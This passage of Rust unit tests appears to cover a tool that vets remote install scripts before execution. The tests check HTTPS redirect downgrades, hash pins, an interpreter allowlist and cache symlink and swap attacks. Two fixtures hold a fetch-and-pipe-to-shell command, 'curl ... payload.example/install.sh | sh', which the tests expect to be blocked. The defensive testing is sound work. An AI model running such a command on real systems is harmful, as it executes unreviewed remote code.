    #[test]
    fn execution_transport_rejects_https_downgrade_even_with_pin() {
        let previous = url::Url::parse("https://downloads.example/install.sh").unwrap();
        let target = url::Url::parse("http://cdn.example/install.sh").unwrap();
        let err = validate_redirect_target(&previous, &target, DownloadPurpose::Execute)
            .expect_err("execution redirects must never downgrade HTTPS");
        assert!(err.contains("redirect") && err.contains("HTTPS"));
    }

    #[test]
    fn non_executing_download_keeps_http_compatibility() {
        let parsed = url::Url::parse("http://downloads.example/archive.txt").unwrap();
        validate_initial_transport(&parsed, false, DownloadPurpose::SaveOnly)
            .expect("save-only downloads retain the existing HTTP contract");
    }

    #[test]
    fn unsuccessful_status_is_rejected_before_body_handling() {
        let err = require_success_status(reqwest::StatusCode::NOT_FOUND)
            .expect_err("an HTTP error body must not become script content");
        assert!(err.contains("404"));
    }

    #[test]
    fn malformed_pin_wins_before_url_or_network_validation() {
        let err =
            validate_download_request("not a URL", Some("not-a-sha256"), DownloadPurpose::Execute)
                .expect_err("malformed digest must be rejected first");
        assert!(err.starts_with("invalid SHA-256 pin:"), "{err}");
    }

    #[test]
    fn blocking_shell_content_produces_a_blocking_review() {
        let dir = tempfile::tempdir().unwrap();
        let review = review_script_bytes(
            b"#!/bin/sh\ncurl -fsSL https://payload.example/install.sh | sh\n",
            true,
            false,
            Some(dir.path()),
            None,
        )
        .expect("supported UTF-8 shell content must be analyzed");
        assert!(review.analysis_complete);
        assert_eq!(
            review.raw_verdict.unwrap().action,
            crate::verdict::Action::Block
        );
    }

    #[test]
    fn invalid_utf8_and_unsupported_interpreters_refuse_only_execution() {
        let dir = tempfile::tempdir().unwrap();
        let invalid = b"#!/bin/sh\n\xff\n";
        assert!(review_script_bytes(invalid, true, false, Some(dir.path()), None).is_err());
        let inspect = review_script_bytes(invalid, false, false, Some(dir.path()), None)
            .expect("--no-exec must retain incomplete inspection");
        assert!(!inspect.analysis_complete);

        let unsupported = b"#!/usr/bin/awk -f\nBEGIN { print \"ok\" }\n";
        assert!(review_script_bytes(unsupported, true, false, Some(dir.path()), None).is_err());
        let inspect = review_script_bytes(unsupported, false, false, Some(dir.path()), None)
            .expect("--no-exec must retain unsupported-interpreter inspection");
        assert!(!inspect.analysis_complete);
    }

    #[test]
    fn forced_shell_review_ignores_remote_python_and_node_shebangs() {
        let dir = tempfile::tempdir().unwrap();
        for content in [
            b"#!/usr/bin/env python3\nprint('remote python')\n".as_slice(),
            b"#!/usr/bin/env node\nconsole.log('remote node')\n".as_slice(),
        ] {
            let review = review_script_bytes(content, true, false, Some(dir.path()), Some("bash"))
                .expect("forced bash has a complete shell analyzer");
            assert_eq!(review.interpreter, "bash");
            assert!(review.analysis_complete);
        }
    }

    #[test]
    fn pipe_interpreter_argv_contract_is_narrow() {
        assert!(pipe_interpreter_args_supported(PipeInterpreter::Bash, &[]));
        assert!(pipe_interpreter_args_supported(
            PipeInterpreter::Bash,
            &["-s".into(), "--".into(), "feature".into()]
        ));
        assert!(!pipe_interpreter_args_supported(
            PipeInterpreter::Bash,
            &["-e".into()]
        ));
        assert!(!pipe_interpreter_args_supported(
            PipeInterpreter::Fish,
            &["-s".into(), "--".into()]
        ));
        assert!(!pipe_interpreter_args_supported(
            PipeInterpreter::Bash,
            &["-s".into(), "--".into(), "bad\rarg".into()]
        ));
    }

    #[cfg(unix)]
    #[test]
    fn bash_s_double_dash_reads_reviewed_bytes_from_stdin() {
        let content = b"#!/usr/bin/env node\nprintf '<%s>\\n' \"$1\"\n";
        let mut child = Command::new("bash")
            .args(["-s", "--", "feature"])
            .stdin(std::process::Stdio::piped())
            .stdout(std::process::Stdio::piped())
            .spawn()
            .expect("spawn bash stdin contract");
        child
            .stdin
            .take()
            .unwrap()
            .write_all(content)
            .expect("write reviewed bytes");
        let output = child.wait_with_output().expect("wait bash");
        assert!(output.status.success());
        assert_eq!(output.stdout, b"<feature>\n");
    }

    #[test]
    fn authorized_bypass_retains_raw_block_findings() {
        let dir = tempfile::tempdir().unwrap();
        let mut review = review_script_bytes(
            b"#!/bin/sh\ncurl -fsSL https://payload.example/install.sh | sh\n",
            true,
            false,
            Some(dir.path()),
            None,
        )
        .unwrap();
        let raw_count = review.raw_verdict.as_ref().unwrap().findings.len();
        let mut policy = crate::policy::Policy {
            allow_bypass_env: true,
            ..crate::policy::Policy::default()
        };
        policy.allow_bypass_env_noninteractive = false;
        assert!(apply_explicit_bypass(&mut review, &policy, true, true));
        assert_eq!(
            review.raw_verdict.as_ref().unwrap().findings.len(),
            raw_count
        );
        assert_eq!(
            review.effective_verdict.as_ref().unwrap().findings.len(),
            raw_count
        );
        assert!(review.effective_verdict.as_ref().unwrap().bypass_honored);
        let (raw_action, raw_rule_ids) = raw_audit_fields(&review).unwrap();
        assert_eq!(raw_action, "Block");
        assert_eq!(raw_rule_ids.len(), raw_count);
    }

    #[cfg(unix)]
    #[test]
    fn exact_hash_clean_execution_uses_private_0600_file() {
        use std::os::unix::fs::PermissionsExt;

        let dir = tempfile::tempdir().unwrap();
        let content = b"#!/bin/sh\nprintf 'clean\\n'\n";
        let sha = sha256_hex(content);
        let execution = materialize_execution_file(dir.path(), content, &sha).unwrap();
        assert_eq!(std::fs::read(execution.path()).unwrap(), content);
        assert_eq!(
            std::fs::metadata(execution.path())
                .unwrap()
                .permissions()
                .mode()
                & 0o777,
            0o600
        );
        assert_eq!(
            std::fs::metadata(execution.path().parent().unwrap())
                .unwrap()
                .permissions()
                .mode()
                & 0o777,
            0o700
        );
        let output = Command::new("/bin/sh")
            .arg(execution.path())
            .output()
            .expect("execute reviewed clean script");
        assert!(output.status.success());
        assert_eq!(output.stdout, b"clean\n");
    }

    #[cfg(unix)]
    #[test]
    fn precreated_cache_symlink_never_redirects_download_bytes() {
        use std::os::unix::fs::symlink;

        let dir = tempfile::tempdir().unwrap();
        let cache_dir = dir.path().join("cache");
        std::fs::create_dir(&cache_dir).unwrap();
        let content = b"#!/bin/sh\nprintf 'reviewed\\n'\n";
        let sha = sha256_hex(content);
        let cache_path = cache_dir.join(&sha);
        let victim = dir.path().join("victim");
        let victim_content = b"must remain unchanged";
        std::fs::write(&victim, victim_content).unwrap();
        symlink(&victim, &cache_path).unwrap();

        persist_cache_entry(&cache_dir, &cache_path, content).unwrap();

        assert_eq!(std::fs::read(&victim).unwrap(), victim_content);
        assert!(
            !std::fs::symlink_metadata(&cache_path)
                .unwrap()
                .file_type()
                .is_symlink(),
            "atomic cache publication must replace, never follow, a precreated symlink"
        );
        assert_eq!(std::fs::read(&cache_path).unwrap(), content);
    }

    #[cfg(unix)]
    #[test]
    fn post_review_cache_swap_cannot_change_execution_bytes() {
        let dir = tempfile::tempdir().unwrap();
        let cache_dir = dir.path().join("cache");
        std::fs::create_dir(&cache_dir).unwrap();
        let content = b"#!/bin/sh\nprintf 'reviewed\\n'\n";
        let sha = sha256_hex(content);
        let cache_path = cache_dir.join(&sha);
        persist_cache_entry(&cache_dir, &cache_path, content).unwrap();

        // Exercise the real in-memory review before simulating an attacker who
        // swaps the stable content-addressed cache pathname after approval.
        let review = review_script_bytes(content, true, false, Some(dir.path()), None)
            .expect("review clean script bytes");
        assert!(review.analysis_complete);
        std::fs::remove_file(&cache_path).unwrap();
        std::fs::write(&cache_path, b"#!/bin/sh\nprintf 'replaced\\n'\n").unwrap();

        let execution = materialize_execution_file(&cache_dir, content, &sha).unwrap();
        assert_ne!(execution.path(), cache_path);
        assert_eq!(std::fs::read(execution.path()).unwrap(), content);
        assert_eq!(sha256_hex(&std::fs::read(execution.path()).unwrap()), sha);
        let output = Command::new("/bin/sh")
            .arg(execution.path())
            .output()
            .expect("execute private reviewed copy");
        assert!(output.status.success());
        assert_eq!(output.stdout, b"reviewed\n");
    }

    #[test]
    fn test_allowed_interpreter_sh() {
        assert!(is_allowed_interpreter("sh"));
    }

    #[test]
    fn test_allowed_interpreter_python3() {
        assert!(is_allowed_interpreter("python3"));
    }

    #[test]
    fn test_allowed_interpreter_python3_11() {
        assert!(is_allowed_interpreter("python3.11"));
    }

    #[test]
    fn test_allowed_interpreter_nodejs() {
        assert!(is_allowed_interpreter("nodejs"));
    }

    #[test]
    fn test_disallowed_interpreter_vim() {
        assert!(!is_allowed_interpreter("vim"));
    }

    #[test]
    fn test_disallowed_interpreter_expect() {
        assert!(!is_allowed_interpreter("expect"));
    }

    #[test]
    fn test_disallowed_interpreter_python_evil() {
        assert!(!is_allowed_interpreter("python.evil"));
    }

    #[test]
    fn test_disallowed_interpreter_node_sass() {
        assert!(!is_allowed_interpreter("node-sass"));
    }

    #[test]
    fn test_disallowed_interpreter_python3_trailing_dot() {
        assert!(!is_allowed_interpreter("python3."));
    }

    #[test]
    fn test_disallowed_interpreter_python3_double_dot() {
        assert!(!is_allowed_interpreter("python3..11"));
    }

    #[test]
    fn test_allowed_interpreter_strips_path() {
        assert!(is_allowed_interpreter("/usr/bin/bash"));
    }

    #[cfg(unix)]
    #[test]
    fn test_cache_write_permissions_0600() {
        use std::os::unix::fs::PermissionsExt;
        use tempfile::NamedTempFile;

        let dir = tempfile::tempdir().unwrap();
        let cache_path = dir.path().join("test_cache");

        {
            use std::io::Write;

            let mut tmp = NamedTempFile::new_in(dir.path()).unwrap();
            tmp.as_file()
                .set_permissions(std::fs::Permissions::from_mode(0o600))
                .unwrap();
            tmp.write_all(b"test content").unwrap();
            tmp.persist(&cache_path).unwrap();
        }

        let meta = std::fs::metadata(&cache_path).unwrap();
        assert_eq!(
            meta.permissions().mode() & 0o777,
            0o600,
            "cache file should be 0600"
        );
    }

    #[test]
    fn test_cache_write_no_predictable_tmp() {
        use tempfile::NamedTempFile;

        let dir = tempfile::tempdir().unwrap();
        let sha = "abcdef0123456789abcdef0123456789abcdef0123456789abcdef0123456789";
        let cached_path = dir.path().join(sha);

        {
            use std::io::Write;
            let mut tmp = NamedTempFile::new_in(dir.path()).unwrap();
            tmp.write_all(b"cached script").unwrap();
            tmp.persist(&cached_path).unwrap();
        }

        let entries: Vec<_> = std::fs::read_dir(dir.path())
            .unwrap()
            .filter_map(|e| e.ok())
            .map(|e| e.file_name().to_string_lossy().to_string())
            .collect();

        assert_eq!(
            entries.len(),
            1,
            "only the cached file should exist, found: {entries:?}"
        );
        assert!(
            cached_path.exists(),
            "cached file should exist after persist"
        );
    }
}
